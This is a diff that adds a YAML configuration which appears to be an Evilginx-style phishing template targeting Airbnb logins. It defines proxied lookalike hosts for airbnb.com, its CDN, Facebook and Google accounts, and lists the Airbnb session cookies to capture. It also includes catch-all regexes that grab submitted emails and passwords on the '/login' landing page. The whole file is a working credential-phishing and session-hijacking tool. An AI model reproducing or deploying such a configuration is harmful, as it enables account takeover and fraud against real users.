@@ -1,0 +1,27 @@
+name: 'airbnb'
+author: '@michael738943'
+min_ver: '2.1.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'airbnb.com', session: true, is_landing: true}
+  - {phish_sub: 'a0', orig_sub: 'a0', domain: 'muscache.com', session: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: false, is_landing: false}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: false, is_landing: false}
+sub_filters:
+  - {hostname: 'www.airbnb.com', sub: 'www', domain: 'airbnb.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'www.airbnb.com', sub: 'www', domain: 'airbnb.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'a0.muscache.com', sub: 'www', domain: 'muscache.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'a0.muscache.com', sub: 'www', domain: 'muscache.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'a0.muscache.com', sub: 'www', domain: 'muscache.com', search: 'src="https://{hostname}', replace: 'src="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'www.facebook.com', sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json']}
+  - {hostname: 'accounts.google.com', sub: 'www', domain: 'google.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json']}
+auth_tokens:
+  - domain: '.airbnb.com'
+    keys: ['_aat','_pt','_airbed_session_id','_csrf_token']
+user_regex:
+  key: 'email'
+  re: '(.*)'
+pass_regex:
+  key: 'password'
+  re: '(.*)'
+landing_path:
+  - '/login'
